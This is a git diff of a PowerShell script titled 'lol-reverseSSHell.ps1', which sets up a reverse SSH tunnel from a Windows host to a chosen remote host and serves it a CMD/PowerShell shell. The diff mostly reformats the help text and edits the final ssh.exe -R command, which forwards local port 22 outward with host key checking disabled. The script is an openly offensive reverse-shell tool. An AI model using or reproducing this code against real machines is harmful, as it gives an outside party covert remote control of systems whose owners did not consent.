@@ -1,5 +1,9 @@
 <#
-.SYNOPSISlol-reverseSSHell.ps1 - Living Off the LAN Reverse Shell | Cmd.exe & PowerShell over SSHThis script will create a reverse ssh connection to a desired host and serve a CMD.exe shell 
+.SYNOPSIS
+lol-reverseSSHell.ps1 - Living Off the LAN Reverse Shell | Cmd.exe & PowerShell over SSH
+
+This script will create a reverse ssh connection to a desired host and serve a CMD.exe shell 
+
 Required: 
   - Run .\lol-reverseSSHell.ps1 as Admin. 
   - OpenSSH Server must be installed on Windows host where this script runs. 
@@ -10,7 +14,12 @@ Required:
       Key Pair B:
         - Private Key B should be placed on destination host recieving the SSH connection. NOT in repo's root.
         - Public Key B should be added to the repo's authorized_keys file.   
-.EXAMPLE   .\LoL-ReverseSSHell.ps1 -DestinationUserName <UserName> -DestinationHost <IP>.EXAMPLE  .\LoL-ReverseSSHell.ps1 -DestinationUserName <UserName> -DestinationHost <IP> -WinPrivateKey [.\winkey] -InstallOpenSSH [yes].EXAMPLE  
+
+.EXAMPLE 
+  .\LoL-ReverseSSHell.ps1 -DestinationUserName <UserName> -DestinationHost <IP>
+.EXAMPLE
+  .\LoL-ReverseSSHell.ps1 -DestinationUserName <UserName> -DestinationHost <IP> -WinPrivateKey [.\winkey] -InstallOpenSSH [yes]
+.EXAMPLE  
   .\LoL-ReverseSSHell.ps1 -DestinationUserName SystemUser -DestinationHost 10.10.10.10 -WinPrivateKey .\winkey -DestinationPort 22 -DestinationBindLocalPort 5555 -InstallOpenSSHServer yes
 
 .NOTES
@@ -101,5 +110,5 @@ IF (!($sshServerStatus.State -eq "Installed")){
 
 # Reverse SSH connection to Remote Host
 Write-Verbose "On $DestinationHost type: ssh localhost -p $DestinationBindLocalPort" -Verbose
-START ssh.exe -fN -R "$DestinationBindLocalPort`:127.0.0.1:22" "$DestinationUserName@$DestinationHost" -p $DestinationPort -i "$WinPrivateKey" -o "StrictHostKeyChecking=no"  # -vvv ## Uncomment '-vvv' to troubleshoot connections.
+ssh.exe -fN -R "$DestinationBindLocalPort`:127.0.0.1:22" "$DestinationUserName@$DestinationHost" -p $DestinationPort -i "$WinPrivateKey" -o "StrictHostKeyChecking=no"  # -vvv ## Uncomment '-vvv' to troubleshoot connections.
 Start-Sleep 10
